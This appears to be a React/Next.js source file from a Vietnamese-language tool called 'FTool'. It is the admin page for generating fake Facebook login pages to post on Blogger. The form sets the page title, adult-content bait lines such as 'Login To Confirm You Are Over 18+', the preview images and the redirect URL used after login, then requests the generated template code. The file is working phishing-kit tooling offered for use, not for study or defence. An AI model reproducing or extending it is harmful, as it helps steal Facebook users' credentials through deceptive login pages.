import { useEffect, useRef, useState } from 'react'
import { useRouter } from 'next/router'
import Head from 'next/head'
import Navbar from '../../components/layout/NavBar'
import SideBar from '../../components/layout/SideBar'
import { useCaculatePageContentHeight, useUser } from '../../utils/hooks'
import {adminSideBarMenuItems} from '../../constants/adminSideBarMenuItems.js'
import Footer from '../../components/layout/Footer'
import { userSideBarMenuItems } from '../../constants/userSideBarMenuItems'

export default function Template() {
    useCaculatePageContentHeight()
    const router = useRouter()
    const { user, loading, error } = useUser()
    const [title, setTitle] = useState('idol.thailand.com')
    const [line1, setLine1] = useState('😘 Login To Confirm You Are Over 18+ 😘')
    const [line2, setLine2] = useState('😘 Watch the video here 😘')
    const [fbImgLink, setFbImgLink] = useState('https://i.imgur.com/KKEqaEm.png')
    const [bloggerLink, setBloggerLink] = useState('https://i.imgur.com/qgpHArj.jpg')
    const [redirectUrl, setRedirectUrl] = useState('https://google.com')
    const [templateResult, setTemplateResult] = useState('')

    const bloggerCodeView = useRef(null)
    const scrollToBloggerCodeView = ()=>bloggerCodeView.current.scrollIntoView()

    const handleSubmit = function (e) {
        e.preventDefault()
        fetch('./api/template/create', {
            method: 'POST',
            headers: {"Content-type": "application/json; charset=UTF-8"},
            body: JSON.stringify({
                title: title, 
                line1: line1,
                line2: line2,
                fbImgLink: fbImgLink,
                bloggerLink: bloggerLink,
                redirectUrl: redirectUrl
            })
        })
        .then(res=>res.json())
        .then(data=>{
            setTemplateResult(data.result)
            scrollToBloggerCodeView()
        })
    }

    if (loading) return <div>Đang tải...</div>
    if (error) return <div>Lỗi khi tải trang...</div>
    return (
        <div className="navbar-top">
            <Head>
                <title>FTool</title>
            </Head>
            <Navbar user={user} />
            <div className="page-container">
                {user ? (
                    <div className="page-content">
                        <SideBar data={user.isAdmin?adminSideBarMenuItems:userSideBarMenuItems} activeId={'3'}/>
                        <div className="content-wrapper">
                            <div className="content">
                                <div className="panel panel-flat">
                                    <div className="panel-heading">
                                        <h5 className="panel-title">Mẫu trang FB giả mạo</h5>
                                        <div className="heading-elements">
                                        </div>
                                    </div>
                                    <div className="panel-body">
                                        <p className="content-group-lg">
                                            Tùy chỉnh mẫu trang đăng nhập fb của bạn
                                        </p>
                                        <form className="form-horizontal" onSubmit={handleSubmit}>
                                            <fieldset className="content-group">
                                                <legend className="text-bold">Các thẻ</legend>
                                            </fieldset>
                                            <div className="form-group">
                                                <label className="control-label col-lg-2">
                                                    Tiêu đề trang
                                                </label>
                                                <div className="col-lg-10">
                                                    <input 
                                                        type="text" 
                                                        className="form-control"
                                                        value={title}
                                                        onChange={e=>setTitle(e.target.value)}></input>
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label className="control-label col-lg-2">
                                                    Dòng trên
                                                </label>
                                                <div className="col-lg-10">
                                                    <input 
                                                        type="text" 
                                                        value={line1}
                                                        onChange={e=>setLine1(e.target.value)}
                                                        className="form-control"
                                                    ></input>
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label className="control-label col-lg-2">
                                                    Dòng dưới
                                                </label>
                                                <div className="col-lg-10">
                                                    <input type="text" 
                                                        className="form-control"
                                                        value={line2}
                                                        onChange={e=>setLine2(e.target.value)}></input>
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label className="control-label col-lg-2">
                                                    Hình ảnh show FB
                                                </label>
                                                <div className="col-lg-10">
                                                    <input type="text" 
                                                        className="form-control"
                                                        value={fbImgLink}
                                                        onChange={e=>setFbImgLink(e.target.value)}></input>
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label className="control-label col-lg-2">
                                                    Hình ảnh show Blogger
                                                </label>
                                                <div className="col-lg-10">
                                                    <input 
                                                        type="text" 
                                                        className="form-control"
                                                        value={bloggerLink}
                                                        onChange={e=>setBloggerLink(e.target.value)}></input>
                                                </div>
                                            </div>
                                            <div className="form-group">
                                                <label className="control-label col-lg-2">
                                                    Link sau đăng nhập
                                                </label>
                                                <div className="col-lg-10">
                                                    <input 
                                                        type="text" 
                                                        className="form-control"
                                                        value={redirectUrl}
                                                        onChange={e=>setRedirectUrl(e.target.value)}></input>
                                                </div>
                                            </div>
                                            <div className="text-right">
                                                <button type="submit" 
                                                    className="btn btn-primary">
                                                    Tạo mẫu Trang
                                                    <i className=""></i>
                                                </button>
                                            </div>
                                        </form>
                                    </div>                                    
                                </div>
                                <div className="panel panel-flat" ref={bloggerCodeView}>
                                    <div className="panel panel-heading">
                                        
                                        <h5 className="panel-title"><i className="icon-blogger"></i> Blog</h5>
                                    </div>
                                    <div className="panel-body">
                                        <textarea rows="5" col="5" 
                                            className="form-control"
                                            value={templateResult}
                                            onChange={e=>this.setTemplateResult(e.target.value)}
                                            placeholder="<.../>"></textarea>
                                    </div>
                                </div>
                                <Footer/>
                            </div>
                        </div>
                    </div>
                ) : (
                    null
                )
                }
            </div>
        </div>
    )
}
